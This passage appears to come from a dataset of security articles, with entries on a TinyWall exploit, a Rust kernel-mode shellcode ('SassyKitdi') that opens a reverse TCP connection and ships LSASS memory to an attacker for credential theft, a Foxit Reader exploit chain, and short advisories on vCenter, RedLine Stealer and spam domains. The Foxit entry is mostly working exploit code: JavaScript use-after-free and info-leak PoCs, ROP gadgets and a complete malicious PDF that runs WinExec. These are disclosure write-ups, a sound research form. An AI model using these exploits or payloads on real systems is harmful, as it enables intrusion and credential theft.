some research on these kind of topics and released several PowerShell scripts . One of these scripts is called Masquerade-PEB which operates on the Process Environment Block (PEB) of a running process to fake the attributes mentioned above in memory. With a slight modification of this script (also left to the reader) this enabled us to fake the MainModule.FileName . Even though the PowerShell implementation could have been ported to C#, we chose the lazy path and imported the System.Management.Automation.dll into our C# Exploit.exe . Creating a PowerShell instance , reading in the modified Masquerade-PEB.ps1 and invoking the code hopefully would result in our faked PEB entries of our Exploit.exe. Checking the result with a tool like Sysinternals Process Explorer confirmed our assumption such that the full exploit could be implemented now to pop some calc without any debugger. Popping the calc Implementing the full exploit now was straight-forward. Using our existing code of James Forshaw's TypeConfuseDelegate code combined with Ruben Boonen's PowerShell script being invoked at the very beginning of our Exploit.exe now was extended by connecting to the Named Pipe TinyWallController . The System.IO.Pipes.NamedPipeClientStream variable pipeClient was finally fed into a BinaryFormatter.Serialize() together with the gadget popping the calc. Thanks to Ruben Boonen's work and support of my colleague Markus Wulftange the final exploit was implemented quickly. Responsible disclosure The vulnerability details were sent to the TinyWall developers on 2019-11-27 and fixed in version 2.1.13 (available since 2019-12-31)."
4fcf5b4b-a8ed-5375-b762-ef9252c86411,15-August-2020,SassyKitdi: Kernel Mode TCP Sockets + LSASS Dump,A shellcode for Windows NT can be used to create a reverse TCP connection in kernel mode. The payload uses the Transport Driver Interface to send data over the wire. The code is written in the Rust programming language and is position-independent.,"Introduction Transport Driver Interface Opening the TCP Device Object Connecting to an Endpoint Sending Data Over the Wire Dumping LSASS from Kernel Mode Obtaining Operating System Information Scraping All Memory Regions Collecting List of Loaded Modules Shellcoding in Rust Compiler Optimizations Using High-Level Constructs Conclusion Introduction This post describes a kernel mode payload for Windows NT called ""SassyKitdi"" (LSASS + Rootkit + TDI). This payload is of a nature that can be deployed via remote kernel exploits such as EternalBlue, BlueKeep, and SMBGhost, as well as from local kernel exploits, i.e. bad drivers. This exploit payload is universal from (at least) Windows 2000 to Windows 10, and without having to carry around weird DKOM offsets. The payload has 0 interaction with user-mode, and creates a reverse TCP socket using the Transport Driver Interface (TDI), a precursor to the more modern Winsock Kernel (WSK). The LSASS.exe process memory and modules are then sent over the wire where they can be transformed into a minidump file on the attacker's end and passed into a tool such as Mimikatz to extract credentials. tl;dr: PoC || GTFO The position-independent shellcode is ~3300 bytes and written entirely in the Rust programming language, using many of its high level abstractions. I will outline some of the benefits of Rust for all future shellcoding needs, and precautions that need to be taken. Figure 0: An oversimplification of the SassyKitdi methodology. I don't have every AV on hand to test against obviously, but given that most AV misses obvious user-mode stuff thrown at it, I can only assume there is currently almost universal ineffectiveness of antivirus available being able to detect the methodology. Finally, I will discuss what a future kernel mode rootkits could look like, if one took this example a couple steps further. What's old is new again. Transport Driver Interface TDI is an old school method to talk to all types of network transports. In this case it will be used to create a reverse TCP connection back to the attacker. Other payloads such as Bind Sockets, as well as UDP, would follow a similar methodology. The use of TDI in rootkits is not exactly widespread, but it has been documented in the following books which served as references for this code: Vieler, R. (2007). Professional Rootkits . Indianapolis, IN: Wiley Technology Pub. Hoglund, G., & Butler, J. (2009). Rootkits: Subverting the Windows Kernel . Upper Saddle River, NJ: Addison-Wesley. Opening the TCP Device Object TDI device objects are found by their device name, in our case \Device\Tcp . Essentially, you use the ZwCreateFile() kernel API with the device name, and pass options in through the use of our old friend File Extended Attributes . pub type ZwCreateFile = extern ""stdcall"" fn( FileHandle: PHANDLE, AccessMask: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, IoStatusBlock: PIO_STATUS_BLOCK, AllocationSize: PLARGE_INTEGER, FileAttributes: ULONG, ShareAccess: ULONG, CreateDisposition: ULONG, CreateOptions: ULONG, EaBuffer: PVOID, EaLength: ULONG, ) -> NTSTATUS; The device name is passed in the ObjectAttributes field, and the configuration is passed in the EaBuffer. We must create a Transport handle (FEA: TransportAddress) and a Connection handle (FEA: ConnectionContext). The TransportAddress FEA takes a TRANSPORT_ADDRESS structure, which for IPv4 consists of a few other structures. It is at this point that we can choose which interface to bind to, or which port to use. In our case, we will choose 0.0.0.0 with port 0, and the kernel will bind us to the main interface with a random ephemeral port. #[repr(C, packed)] pub struct TDI_ADDRESS_IP { pub sin_port: USHORT, pub in_addr: ULONG, pub sin_zero: [UCHAR; 8], } #[repr(C, packed)] pub struct TA_ADDRESS { pub AddressLength: USHORT, pub AddressType: USHORT, pub Address: TDI_ADDRESS_IP, } #[repr(C, packed)] pub struct TRANSPORT_ADDRESS { pub TAAddressCount: LONG, pub Address: [TA_ADDRESS; 1], } The ConnectionContext FEA allows setting of an arbitrary context instead of a defined struct. In the example code we just set this to NULL and move on. At this point we have created the Transport Handle, Transport File Object, Connection Handle, and Connection File Object. Connecting to an Endpoint After initial setup, the rest of TDI API is performed through IOCTLs to the device object associated with our File Objects. TDI uses IRP_MJ_INTERNAL_DEVICE_CONTROL with various minor codes. The ones we are interested in are: #[repr(u8)] pub enum TDI_INTERNAL_IOCTL_MINOR_CODES { TDI_ASSOCIATE_ADDRESS = 0x1, TDI_CONNECT = 0x3, TDI_SEND = 0x7, TDI_SET_EVENT_HANDLER = 0xb, } Each of these internal IOCTLs has various structures associated with them. The basic methodology is to: Get the Device Object from the File Object using IoGetRelatedDeviceObject() Create the internal IOCTL IRP using IoBuildDeviceIoControlRequest() Set the opcode inside IO_STACK_LOCATION.MinorFunction Copy the op's struct pointer to the IO_STACK_LOCATION.Parameters Dispatch the IRP with IofCallDriver() Wait for the operation to complete using KeWaitForSingleObject() (optional) For the TDI_CONNECT operation, the IRP parameters includes a TRANSPORT_ADDRESS structure (defined in the previous section). This time, instead of setting it to 0.0.0.0 port 0, we set it to the values of where we want to connect (and, in big endian). Sending Data Over the Wire If the connection IRP succeeds in establishing a TCP connection, we can then send TDI_SEND IRPs to the TCP device. The TDI driver expects a Memory Descriptor List (MDL) that describes the buffer to send over the network. Assuming we want to send some arbitrary data over the wire, we must perform the following steps: ExAllocatePool() a buffer and RtlCopyMemory() the data over (optional) IoAllocateMdl() providing the buffer address and size MmProbeAndLockPages() to page-in during the send operation Dispatch the Send IRP The I/O manager will unlock the pages and free the MDL ExFreePool() the buffer (optional) In this case the MDL is attached to the IRP. The Parameters structure we can just set SendFlags to 0 and SendLength to the data size. #[repr(C, packed)] pub struct TDI_REQUEST_KERNEL_SEND { pub SendLength: ULONG, pub SendFlags: ULONG, } Dumping LSASS from Kernel Mode LSASS is of course the goldmine on Windows, where prizes such as cleartext credentials and kerberos information can be obtained. Many AV vendors are getting better at hardening LSASS when attempting to dump from user-mode. But we'll do it from the privilege of the kernel. Mimikatz requires 3 streams to process a minidump: System Information, Memory Ranges, and Module List. Obtaining Operating System Information Mimikatz really only needs to know the Major, Minor, and Build versions of NT. This can be obtained with the NTOSKRNL exported function RtlGetVersion() that provides the following struct: #[repr(C)] pub struct RTL_OSVERSIONINFOW { pub dwOSVersionInfoSize: ULONG, pub dwMajorVersion: ULONG, pub dwMinorVersion: ULONG, pub dwBuildNumber: ULONG, pub dwPlatformId: ULONG, pub szCSDVersion: [UINT16; 128], } Scraping All Memory Regions Of course, the most important part of an LSASS dump is the actual memory of the LSASS process. Using KeStackAttachProcess() allows one to read the virtual memory of LSASS. From there it is possible to iterate over memory ranges with ZwQueryVirtualMemory(). pub type ZwQueryVirtualMemory = extern ""stdcall"" fn( ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MEMORY_INFORMATION_CLASS, MemoryInformation: PVOID, MemoryInformationLength: SIZE_T, ReturnLength: PSIZE_T, ) -> crate::types::NTSTATUS; Pass in -1 for the ProcessHandle, 0 for the initial BaseAddress, and use the MemoryBasicInformation class to receive the following struct: #[repr(C)] pub struct MEMORY_BASIC_INFORMATION { pub BaseAddress: PVOID, pub AllocationBase: PVOID, pub AllocationProtect: ULONG, pub PartitionId: USHORT, pub RegionSize: SIZE_T, pub State: ULONG, pub Protect: ULONG, pub Type: ULONG, } For the next iteration of ZwQueryVirtualMemory(), just set the next BaseAddress to BaseAddress+RegionSize. Keep iterating until ReturnLength is 0 or there is an NT error. Collecting List of Loaded Modules Mimikatz also requires to know where a few of the DLLs are located in memory in order to scrape some secrets out of them during processing. The most convenient way to iterate these is to grab the DLL list out of the PEB. The PEB can be found using ZwQueryInformationProcess() with the ProcessBasicInformation class. Mimikatz requires the DLL name, address, and size. These are easily scraped out of PEB->Ldr.InLoadOrderLinks, which is a well-documented methodology to obtain the linked list of LDR_DATA_TABLE_ENTRY entries. #[cfg(target_arch=""x86_64"")] #[repr(C, packed)] pub struct LDR_DATA_TABLE_ENTRY { pub InLoadOrderLinks: LIST_ENTRY, pub InMemoryOrderLinks: LIST_ENTRY, pub InInitializationOrderLinks: LIST_ENTRY, pub DllBase: PVOID, pub EntryPoint: PVOID, pub SizeOfImage: ULONG, pub Padding_0x44_0x48: [BYTE; 4], pub FullDllName: UNICODE_STRING, pub BaseDllName: UNICODE_STRING, /* ...etc... */ } Just iterate the linked list til you wind back at the beginning, grabbing FullDllName, DllBase, and SizeOfImage of each DLL for the dump file. Notes on Shellcoding in Rust Rust is one of the more modern languages trending these days. It does not require a run-time and can be used to write extremely low-level embedded code that interacts with C FFI. To my knowledge there are only a few things that C/C++ can do that Rust cannot: C variadic functions (coming soon) and SEH (outside of internal panic operations?). It is simple enough to cross-compile Rust from Linux using the mingw-w64 linker, and use Rustup to add the x86_64-windows-pc-gnu target. I create a DLL project and extract the code between _DllMainCRTStartup() and malloc(). Not very stable perhaps, but I could only figure out how to generate PE files and not something such as a COM file. Here's an example of how nice shellcoding in Rust can be: let mut socket = nttdi::TdiSocket::new(tdi_ctx); socket.add_recv_handler(recv_handler); socket.connect(0xdd01a8c0, 0xBCFB)?; // 192.168.1.221:64444 socket.send(""abc"".as_bytes().as_ptr(), 3)?; Compiler Optimizations Rust sits atop LLVM, an intermediate language before final code generation, and thus benefits from many of the optimizations that languages such as C++ (Clang) have received over the years. I won't get too deep into the weeds, especially with zealots on all sides, but the highly static compilation nature of Rust often results in much smaller code size than C or C++. Code size is not necessarily an indicator of performance, but for shellcode it is important. You can do your own testing, but Rust's code generation is extremely good. We can set the Cargo.toml file to use opt-level='z' (optimize for size) lto=true (link time optimize) to further reduce generated code size. Using High-Level Constructs The most obvious high-level benefit of using Rust is RAII . In Windows this means HANDLEs can be automatically closed, kernel pools automatically freed, etc. when our encapsulating objects go out of scope. Simple constructors and destructors such as these examples are aggressively inlined with our Rust compiler flags. Rust has concepts such as ""Result<Ok, Err>"" return types, as well as the ? 'unwrap or throw' operator , which allows us to bubble up errors in a streamlined fashion. We can return tuples in the Ok slot, and NTSTATUS codes in the Err slot if something goes wrong. The code generation for this feature is minimal, often returning a double wide struct. The bookkeeping is basically equivalent to the amount of bytes it would take to do by hand, but simplifies the high level code considerably. For shellcoding purposes, we cannot use the ""std"" library (to digress, well, we could add an allocator), and must use Rust ""core"" only. Further, many open-source crate libraries are off-limits due to causing the code to not be position independent. For this reason, a new crate called `ntdef` was created, which simply contains only definitions of types and 0 static-positioned information. Oh, and if you ever need stack-based wide-strings (perhaps something else missing from C), check out JennaMagius' stacklstr crate. Due to the low-level nature of the code, its FFI interactions with the kernel, and having to carry around context pointers, most of the shellcode is ""unsafe"" Rust code. Writing shellcode by hand is tedious and results in long debug sessions. The ability to write the assembly template in a high-level abstraction language like Rust saves enormous amounts of time in research and development. Handcrafted assembly will always result in smaller code size, but having a guide to go off of is of great benefit. After all, optimizing compilers are written by humans, and all edge cases are not taken into account. Conclusion SassyKitdi must be performed at PASSIVE_LEVEL. To use the sample project in an exploit payload, you will need to provide your own exploit preamble. This is the unique part of the exploit that cleans up the stack frame, and in e.g. EternalBlue lowers the IRQL from DISPATCH_LEVEL. What is interesting to consider is turning the use of a TDI exploit payload into the staging for a kernel-mode Meterpreter like framework. It is very easy to tweak the provided code to instead download and execute a larger secondary kernel-mode payload. This can take the form of a reflectively-loaded driver. Such a framework would have easy access to tokens, files, and many other functionalities that are currently getting caught by AV in user-mode. This initial staging shellcode can be hand-shrunk to approximately 1000-1500 bytes."
9ca201af-3088-51d5-ab30-b59504b8bd85,10-October-2022,Vulnerability Spotlight: Data deserialization in VMware vCenter could lead to remote code execution,Cisco Talos has discovered a vulnerability in the VMware vCenter server platform. The vulnerability is a post-authentication Java deserialization issue that can be exploited. The exploit could allow an attacker to exploit arbitrary code on a target machine.,"Marcin “Icewall” Noga of Cisco Talos discovered this vulnerability. Blog by Jon Munshaw. Cisco Talos recently discovered an exploitable data deserialization vulnerability in the VMware vCenter server platform. VMware is one of the most popular virtual machine solutions currently available, and its vCenter software allows users to manage an entire environment of VMs. The vulnerability Talos discovered is a post-authentication Java deserialization issue that could corrupt the software in a way that could allow an attacker to exploit arbitrary code on the target machine. TALOS-2022-1587 (CVE-2022-31680) is triggered if an adversary sends a specially crafted HTTP request to a targeted machine. The attacker would first have to log in with legitimate credentials to vCenter to be successful. Cisco Talos worked with VMware to ensure that this issue is resolved and an update is available for affected customers, all in adherence to Cisco’s vulnerability disclosure policy . Users are encouraged to update these affected products as soon as possible: VMware vCenter Server, version 6.5, update 3t. Talos tested and confirmed this version of vCenter could be exploited by this vulnerability. The following Snort rules will detect exploitation attempts against this vulnerability: 60433. Additional rules may be released in the future and current rules are subject to change, pending additional vulnerability information. For the most current rule information, please refer to your Firepower Management Center or Snort.org."
66b088c6-1bdc-5521-a819-eed3060b78ae,27-April-2022,RedLine Stealer Resurfaces in Fresh RIG Exploit Kit Campaign,RedLine Stealer is a low-cost password stealer sold on underground forums. It uses exploits found in Internet Explorer to exfiltrate data to a remote control server.,"At the start of the year, Bitdefender noticed a RIG Exploit Kit campaign using CVE-2021-26411 exploits found in Internet Explorer to deliver RedLine Stealer, a low-cost password stealer sold on underground forums. When executed, RedLine Stealer performs recon against the target system (including username, hardware, browsers installed, anti-virus software) and then exfiltrates data (including passwords, saved credit cards, crypto wallets, VPN logins) to a remote command and control server. Download the RedLine Stealer whitepaper Download the RedLine Stealer whitepaper"
99414e24-a319-5cc9-a98f-55d7277fddb0,22-June-2018,Foxes Among Us :: Foxit Reader Vulnerability Discovery and Exploitation,A full exploit chain for Foxit Reader and PhantomPDF Reader. I exploit two different bugs to defeat ASLR and DEP. I found and exploited a vulnerability in a Typed Array and a use-after-free vulnerability. The exploit chain was created using a JavaScript bridge plugin for the PDF parsers.,"After discovering over 100 vulnerabilities in Foxit Reader, I figured it was about time I shared a full exploit chain that defeats ASLR and DEP. The first vulnerability is an uninitialized buffer that I found independently and was later killed by bit from meepwn. I leveraged this for an information leak to defeat ASLR. The second vulnerability is a use-after-free that I found, killed and leveraged for remote code execution. TL;DR; I walk through exploiting a two different bugs chained together to achieve reliable code execution on a Windows 7 & 10 x86 desktop against Foxit Reader 9.0.1.1049. Introduction Foxit Reader and PhantomPDF Reader are marketed as… …Fast, Affordable & Secure PDF Solutions However, as Adobe is aware, PDF parsing is a complex task and quite often error prone. Many vulnerabilities have been found inside of clientside PDF parsers and the fact that they need to support JavaScript creates an additional attack surface and greatly facilitates exploitation. Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability This vulnerability was assigned CVE-2018-9948 and published as ZDI-18-332 by the ZDI . It was discovered by myself and bit from meepwn, however bit beat me too it reporting it to the ZDI. That, unfortunately, is how it rolls sometimes. Let’s take a look at some poc code. A minimised poc can be see below that will trigger the vulnerability: var int32View = new Int32Array ( 0x6c ); app . alert ( util . printf ( "" Uninitialized: 0x%04x "" , int32View [ 0 ])); After enabling page heap, we can see we can read back the (in)famous 0xc0c0c0c0 magic marker of where uninitialized data is. There are a couple of things to note about this vulnerability. The first thing is that this vulnerability cannot be discovered via traditional fuzzing, since the application will never crash. I built a windbg plugin to help detect these types of vulnerabilities called bridgit . Bridgit is a JavaScript bridge plugin for Foxit Reader that helps facilitate with vulnerability discovery and exploitation. The other thing to note that all the TypedArray’s are vulnerable with a single allocation (just like the advisory states). We can confirm this by using bridgit. 0:022> !py bridgit -o find_ub -s 0x6c Bridgit - JavaScript Bridge for Foxit Reader mr_me 2018 (+) setting up __CIatan_pentium4 bp (+) setting up __CIasin_pentium4 bp Breakpoint 0 hit (+) DEBUG ATAN: (+) enabling heap hook Breakpoint 2 hit (+) enabling heap alloc bp Breakpoint 3 hit Breakpoint 2 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 3 hit Breakpoint 1 hit (+) DEBUG ASIN: (+) disabling heap hook Breakpoint 4 hit (+) disabling heap alloc bp (6b4.a60): Break instruction exception - code 80000003 (first chance) (+) found uninitialized chunk: 0x100bef90 address 100bef90 found in _DPH_HEAP_ROOT @ 6aa1000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 111136b4: 100bef90 6c - 100be000 2000 718e8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 772461fe ntdll!RtlDebugAllocateHeap+0x00000030 7720a0d3 ntdll!RtlpAllocateHeap+0x000000c4 771d58e0 ntdll!RtlAllocateHeap+0x0000023a 028cee12 FoxitReader!CertFreeCertificateChain+0x013a2a32 0117810c FoxitReader+0x0034810c 024d122a FoxitReader!CertFreeCertificateChain+0x00fa4e4a 024d146e FoxitReader!CertFreeCertificateChain+0x00fa508e 024e7943 FoxitReader!CertFreeCertificateChain+0x00fbb563 100bef90 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100befa0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100befb0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100befc0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100befd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100befe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 100beff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 d0d0d0d0 100bf000 ???????? ???????? ???????? ???????? (+) done! After trying different TypedArray’s we can see that Int32Array and Float32Array are allocated from exactly the same positions, that is in FoxitReader!CertFreeCertificateChain+0x013a2a32 . It’s always good to confirm exactly what was patched! Exploitation An uninitialized TypedArray is a very powerful primitive, because we can specify the size of the buffer, thus, we can clobber almost any other buffer that we can allocate and free. For those that are unaware, typical exploitation of an uninitialized buffer can usually be achieved by allocating an object of n size and then freeing that buffer before triggering the uninitialized buffer allocation. Where n is the size of the uninitialized buffer (in our case, basically any size). After some analysis, I found the perfect candidate and as it turns out, you can allocate an annotation object of size 0x5c, which, when freed is rounded to 0x60. // allocates the annotation var a = this . addAnnot ({ type : "" Text "" }); // free's the annotation a . destroy (); Now, we can combine this to leak the vtable of the text annotation. // allocates the annotation var a = this . addAnnot ({ type : "" Text "" }); // free's the annotation a . destroy (); // allocate the freed chunk var test = new ArrayBuffer ( 0x60 ); var int32View = new Int32Array ( test ); // mask off the lower word var leaked = int32View [ 0 ] & 0xffff0000 ; // calculate an offset for version FoxitReader 9.0.1.1049 var foxit_base = leaked - 0x01f50000 ; app . alert ( util . printf ( "" FoxitReader base address: 0x%08x "" , foxit_base )); After turning off page heap and firing the poc, we can see that we are leaking the base address of FoxitReader.exe: Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability This vulnerability was assigned CVE-2018-9958 and published as ZDI-18-342 by the ZDI . It was discovered by yours trully. Let’s take a look at some poc code. A minimised poc can be see below that will trigger the vulnerability: // create an annotation var a = this . addAnnot ({ type : "" Text "" , page : 0 , name : "" uaf "" }); // create an array with an element var arr = [ 1 ]; // make sure we can access the Document object var that = this ; // setup the getter callback on element 0 Object . defineProperties ( arr ,{ "" 0 "" :{ get : function () { // free the annotation that . getAnnot ( 0 , "" uaf "" ). destroy (); return 1 ; } } }); // trigger uaf a . point = arr ; So when setting the point property of a text annotation that is created dynamically and we can trigger a JavaScript callback via a getter call on the first element in an array. In this getter, we can see that we destroy the created annotation, whilst setting a property on that annotation. This triggers the use-after-free and after running it with page heap enabled, we get the following crash: (31c.f70): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=1911bfa0 ebx=00000000 ecx=1911bfa0 edx=18b08001 esi=193aaff8 edi=1845ffc8 eip=008ecfb9 esp=03b7e814 ebp=03b7e82c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210206 FoxitReader!CertFreeCertificateChain+0x150bd9: 008ecfb9 8b01 mov eax,dword ptr [ecx] ds:0023:1911bfa0=???????? 0:000> u . L4 FoxitReader!CertFreeCertificateChain+0x150bd9: 008ecfb9 8b01 mov eax,dword ptr [ecx] 008ecfbb 8b5008 mov edx,dword ptr [eax+8] 008ecfbe 56 push esi 008ecfbf ffd2 call edx This is classic use-after-free with a vtable call, so all we really need to do it control the allocation. We already know that we can disclose memory locations. Exploitation We can disable page heap and set a breakpoint at the crash location to find the size of the freed object. 0:018> bp FoxitReader!CertFreeCertificateChain+0x150bd9 0:018> g Breakpoint 0 hit eax=075619a8 ebx=00000000 ecx=075619a8 edx=37c08001 esi=076d87f8 edi=076d8de8 eip=014bcfb9 esp=0026e284 ebp=0026e29c iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200206 FoxitReader!CertFreeCertificateChain+0x150bd9: 014bcfb9 8b01 mov eax,dword ptr [ecx] ds:0023:075619a8=02bc0147 0:000> !heap -p -a @ecx address 075619a8 found in _HEAP @ 6c0000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 075619a0 000d 0000 [00] 075619a8 00060 - (free) We can see that the object is of size 0x60 and we can use a TypedArray to take control just after the free. function reclaim (){ var arr = new Array ( 0x10 ); for ( var i = 0 ; i < arr . length ; i ++ ) { arr [ i ] = new ArrayBuffer ( 0x60 ); var rop = new Int32Array ( arr [ i ]); for ( var j = 0 ; j < rop . length ; j ++ ) { rop [ j ] = 0x41414141 ; } } } // create an annotation var a = this . addAnnot ({ type : "" Text "" , page : 0 , name : "" uaf "" }); // create an array with an element var arr = [ 1 ]; // make sure we can access the Document object var that = this ; // setup the getter callback on element 0 Object . defineProperties ( arr ,{ "" 0 "" :{ get : function () { // free the annotation that . getAnnot ( 0 , "" uaf "" ). destroy (); // reclaim the freed object reclaim (); return 1 ; } } }); // trigger uaf a . point = arr ; Just after the destroy() we call reclaim() which will allocate 0x10 TypedArray’s of size 0x60. We do an iteration of 0x10 just to be extra sure we catch the freed object before its re-use. After re-running the updated poc, sure enough, we replaced the freed object and have execution control. (df8.16b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=41414141 ebx=00000000 ecx=073419a8 edx=24508001 esi=074a8068 edi=074a4270 eip=014bcfbb esp=0012e3cc ebp=0012e3e4 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210216 FoxitReader!CertFreeCertificateChain+0x150bdb: 014bcfbb 8b5008 mov edx,dword ptr [eax+8] ds:0023:41414149=???????? 0:000> dd @ecx 073419a8 41414141 41414141 41414141 41414141 073419b8 41414141 41414141 41414141 41414141 073419c8 41414141 41414141 41414141 41414141 073419d8 41414141 41414141 41414141 41414141 073419e8 41414141 41414141 41414141 41414141 073419f8 41414141 41414141 41414141 41414141 07341a08 58c64fcb 8c000000 00000001 00000026 07341a18 00000027 003a005a 0072005c 00730065 At this point (get it, point?) there was a few different ways we could chain the vulnerabilities. What we need to do now is get some data we control into memory at a known address. Traditionally, this is with a heap spray and a predictable address that we can spray at. However, after pondering a little more it occured to me that we can avoid a heap spray entirely. What I had to do was leak a heap chunk pointer from the text annotation which was (ab)used for the uninitialized TypedArray. Then, reclaim that memory with a TypeArray, setting its contents to a stack pivot and setting the reclaimed object’s fake vtable to this leaked address, thus avoiding a heap spray. Surprisingly, this worked with 100% success rate. You can download the full exploit that works on both Windows 7 and 10 (at the time) here . I also developed an additional poc with a heap spray just incase the heap chunk leak would fail. This poc only worked on Windows 7: %PDF 1 0 obj <</Pages 1 0 R /OpenAction 2 0 R>> 2 0 obj <</S /JavaScript /JS ( var heap_ptr = 0 ; var foxit_base = 0 ; function heap_spray ( size ){ var arr = new Array ( size ); for ( var i = 0 ; i < arr . length ; i ++ ) { // re-claim and stack pivot arr [ i ] = new ArrayBuffer ( 0x10000 - 0x8 ); var claimed = new Int32Array ( arr [ i ]); for ( var j = 0 ; j < claimed . length ; j ++ ) { // stack pivot from FoxitReader.exe v9.0.1.1049 (sha1: a01a5bde0699abda8294d73544a1ec6b4115fa68) claimed [ j ] = foxit_base + 0x01a7ee23 ; // push ecx; pop esp; pop ebp; ret 4 } } } function leak (){ /* Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948 Found By: bit from meepwn team */ // alloc var a = this . addAnnot ({ type : "" Text "" }); // free a . destroy (); // reclaim var test = new ArrayBuffer ( 0x60 ); var stolen = new Int32Array ( test ); // leak the vftable var leaked = stolen [ 0 ] & 0xffff0000 ; // a hard coded offset to FoxitReader.exe base v9.0.1.1049 (sha1: a01a5bde0699abda8294d73544a1ec6b4115fa68) foxit_base = leaked - 0x01f50000 ; } function reclaim (){ /* This function reclaims the freed chunk, so we can get rce and I do it a few times for reliability. All gadgets are from FoxitReader.exe v9.0.1.1049 (sha1: a01a5bde0699abda8294d73544a1ec6b4115fa68) */ var arr = new Array ( 0x10 ); for ( var i = 0 ; i < arr . length ; i ++ ) { arr [ i ] = new ArrayBuffer ( 0x60 ); var rop = new Int32Array ( arr [ i ]); rop [ 0x00 ] = 0x11000048 ; // pointer to our stack pivot from the heap spray rop [ 0x01 ] = foxit_base + 0x01a11d09 ; // xor ebx,ebx; or [eax],eax; ret rop [ 0x02 ] = 0x72727272 ; // junk rop [ 0x03 ] = foxit_base + 0x00001450 // pop ebp; ret rop [ 0x04 ] = 0xffffffff ; // ret of WinExec rop [ 0x05 ] = foxit_base + 0x0069a802 ; // pop eax; ret rop [ 0x06 ] = foxit_base + 0x01f2257c ; // IAT WinExec rop [ 0x07 ] = foxit_base + 0x0000c6c0 ; // mov eax,[eax]; ret rop [ 0x08 ] = foxit_base + 0x00049d4e ; // xchg esi,eax; ret rop [ 0x09 ] = foxit_base + 0x00025cd6 ; // pop edi; ret rop [ 0x0a ] = foxit_base + 0x0041c6ca ; // ret rop [ 0x0b ] = foxit_base + 0x000254fc ; // pushad; ret rop [ 0x0c ] = 0x636c6163 ; // calc rop [ 0x0d ] = 0x00000000 ; // adios, amigo for ( var j = 0x0e ; j < rop . length ; j ++ ) { rop [ j ] = 0x71727374 ; } } } function trigger_uaf (){ /* Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability ZDI-CAN-5620 / ZDI-18-342 / CVE-2018-9958 Found By: Steven Seeley (mr_me) of Source Incite */ var that = this ; var a = this . addAnnot ({ type : "" Text "" , page : 0 , name : "" uaf "" }); var arr = [ 1 ]; Object . defineProperties ( arr ,{ "" 0 "" :{ get : function () { // free that . getAnnot ( 0 , "" uaf "" ). destroy (); // reclaim freed memory reclaim (); return 1 ; } } }); a . point = arr ; } leak (); heap_spray ( 0x800 ); trigger_uaf (); )>> trailer <</Root 1 0 R>> The final exploit just uses a WinExec call and doesn’t bother to modify memory, since many third party malware protection tools look for memory modification techniques I was lazy. I did see a LoadLibraryW in FoxitReader’s IAT, hint hint. I didn’t bother with continue of execution (CoE) since I don’t work for an offense company anymore but all you would need to do is save the registers before the chain, return back to the stack after WinExec and restore the registers again, including the stack. FoxitReader.exe is 55MB in size, so finding ROP gadgets is a piece of cake for all of this. Anyway, on to the show! Timeline 2018-03-01 – Verified and sent to the ZDI 2018-03-24 – Vulnerability acquired 2018-03-30 – Vendor disclosure 2018-04-20 – Patched and disclosed Conclusion Foxit Reader still has relatively little protections against memory corruption vulnerabilities. The developers rely heavily on operating system mitigations. When you have a JavaScript attack surface, you best believe that operating system mitigations are not enough, application level mitigations such as control flow guard, isolated heap and a decent sandbox would have significantly impacted me in the development of this exploit. TypeArray’s are simply too powerful againt most software products and facilitated immensely in the final exploit. They were used for the information disclosure (both .data and .text addresses), the heap spray and the object replacement. References https://www.zerodayinitiative.com/advisories/ZDI-18-332/ https://www.zerodayinitiative.com/advisories/ZDI-18-342/ https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf https://github.com/saelo/foxpwn/blob/master/code.js#L297 https://github.com/saaramar/Deterministic_LFH"
13f17f08-e199-5aa2-a737-dafb8f3c313d,18-October-2022,Insights Into an Active Spam Domain Portfolio,"Malicious spam is one of enterprises' biggest security concerns. Spamhaus has expanded a list of 53 verified malicious spam domains to 354. Most of the domains were geolocated in the U.S., China, Germany, and Japan.","Malicious spam, possibly the oldest kind of cyber threat, likely remains one of enterprises’ biggest security concerns. Regardless of form and affected device, clicking a malicious link embedded in a spam email or downloading a malware-laden attachment can lead to financial, data, or identity theft. To this end, knowing and consequently blocking access to where these harmful messages come from is of utmost importance to companies. As part of our ongoing effort to make the Internet safer, we sought to expand an initial list of 53 verified malicious spam domains aided by WHOIS, DNS, and IP intelligence. Our findings include: A sample of the additional artifacts obtained from our analysis is available for download from our website . We began our investigation by looking for identifiable characteristics among the IoCs. To do so, we ran them through a bulk WHOIS lookup that revealed: We subjected the IoCs to DNS lookups , which led to the discovery of 71 IP addresses to which they resolved. While none of them are currently detected as malicious, their connection to confirmed malicious spam domains warrant that they at least be monitored for signs of criminal activity. A bulk IP geolocation lookup for the IP addresses showed that most of them were geolocated in the U.S., China, Germany, and Japan. Apart from Japan, the U.S., China, and Germany were part of 